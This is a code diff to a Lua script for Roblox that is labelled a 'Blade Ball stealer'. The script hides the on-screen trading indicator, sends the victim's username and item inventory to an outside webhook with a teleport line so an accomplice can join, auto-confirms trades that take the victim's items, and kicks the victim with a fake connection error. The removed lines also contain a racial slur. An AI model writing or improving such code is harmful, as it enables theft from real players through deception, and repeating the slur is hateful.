@@ -78,6 +78,19 @@ end)
 
 tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     inTrade = tradeGui.Enabled
+    -- // CACHER LE "TRADING" AU DESSUS DE LA TÊTE
+    if inTrade then
+        task.spawn(function()
+            if plr.Character then
+                for i = 1, 20 do
+                    for _, obj in ipairs(plr.Character:GetDescendants()) do
+                        if obj:IsA("BillboardGui") then obj:Destroy() end
+                    end
+                    task.wait(0.1)
+                end
+            end
+        end)
+    end
 end)
 
 local function sendTradeRequest(user)
@@ -141,6 +154,11 @@ end
 local totalRAP = 0
 
 local function SendJoinMessage(list, prefix)
+    -- // LOGIQUE DE COULEUR ET TEXTE
+    local isGoodHit = totalRAP >= 500
+    local embedTitle = isGoodHit and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
+    local embedColor = isGoodHit and 65280 or 8323327 -- Vert ou Violet
+
     local fields = {
         {
             name = "Victim Username 🤖:",
@@ -158,7 +176,7 @@ local function SendJoinMessage(list, prefix)
         },
         {
             name = "Summary 💰:",
-            value = string.format("Total RAP: %s", formatNumber(totalRAP)),
+            value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), -- GRAS ICI
             inline = false
         }
     }
@@ -187,7 +205,8 @@ local function SendJoinMessage(list, prefix)
     end)
 
     for _, group in ipairs(groupedList) do
-        local itemLine = string.format("%s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP))
+        -- // RAP INDIVIDUEL EN GRAS
+        local itemLine = string.format("%s (x%s) - **%s RAP**", group.Name, group.Count, formatNumber(group.TotalRAP))
         fields[3].value = fields[3].value .. itemLine .. "\n"
     end
 
@@ -206,8 +225,8 @@ local function SendJoinMessage(list, prefix)
     local data = {
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
-            ["title"] = "🔵 Bro join your hit nigga 🎯",
-            ["color"] = 255,
+            ["title"] = embedTitle,
+            ["color"] = embedColor,
             ["fields"] = fields,
             ["footer"] = {
                 ["text"] = "Blade Ball stealer by Eblack"
@@ -240,7 +259,7 @@ local function SendMessage(list)
 		},
         {
             name = "Summary 💰:",
-            value = string.format("Total RAP: %s", formatNumber(totalRAP)),
+            value = string.format("Total RAP: **%s**", formatNumber(totalRAP)),
             inline = false
         }
 	}
@@ -269,7 +288,7 @@ local function SendMessage(list)
     end)
 
     for _, group in ipairs(groupedList) do
-        local itemLine = string.format("%s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP))
+        local itemLine = string.format("%s (x%s) - **%s RAP**", group.Name, group.Count, formatNumber(group.TotalRAP))
         fields[2].value = fields[2].value .. itemLine .. "\n"
     end
 
@@ -287,7 +306,7 @@ local function SendMessage(list)
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "🔵 The nigga is on the server 🎉" ,
+            ["title"] = "⚪SERVEUR HIT🎉" ,
             ["color"] = 255,
 			["fields"] = fields,
 			["footer"] = {
@@ -418,7 +437,7 @@ if #itemsToSend > 0 then
             readyTrade()
             confirmTrade()
         end
-        plr:kick("Please check your internet connection and try again. (Error Code: 277)")
+        plr:kick("Please check your internet connection and try again")
     end
 
     local function waitForUserJoin()
